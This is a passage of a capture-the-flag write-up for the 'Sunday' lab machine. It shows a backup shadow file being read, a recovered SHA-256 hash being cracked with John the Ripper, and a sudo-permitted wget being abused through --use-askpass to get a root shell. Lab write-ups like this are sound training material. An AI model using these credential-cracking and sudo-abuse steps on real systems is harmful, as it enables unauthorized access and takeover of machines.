We login as sunny user and after use `sudo -l` we can see that we have sudo access to /root/troll so if we execute the file we have the following

```bash
ssh sunny@10.10.10.76 -p 22022

sunny@sunday:~$ sudo /root/troll
testing
uid=0(root) gid=0(root)
```

But we cannot edit the file to execute it, so lets check more things. In the `/` directory we can find a folder called `backup`, inside we will find a hash for the sammy user

```bash
sunny@sunday:/backup$ cat shadow.backup
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```

We can retrieve the password with John The Ripper

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Sunday-10.10.10.76]
└─$ john -w=/usr/share/wordlists/rockyou.txt sammy_hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (sha256crypt, crypt(3) $5$ [SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
cooldude!        (?)     
1g 0:00:00:35 DONE (2023-07-12 11:40) 0.02780g/s 5666p/s 5666c/s 5666C/s domonique1..chrystelle
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

So now we can move laterally with sammy:cooldude! credentials

```bash
ssh sammy@10.10.10.76 -p 22022

-bash-4.4$ sudo -l
User sammy may run the following commands on sunday:
    (ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```

We can use wget as sudo so we go to **[GTFOBins](https://gtfobins.github.io/gtfobins/wget/#shel)** and use wget to escalate privileges

```bash
sammy@sunday:/tmp$ TF=$(mktemp)
sammy@sunday:/tmp$ chmod +x $TF                                             
sammy@sunday:/tmp$ echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF                   
sammy@sunday:/tmp$ sudo wget --use-askpass=$TF 0                            
/tmp/tmp.xFnipa[1]: -e: not found [No such file or directory]
root@sunday:/tmp# whoami
root
```

And we are root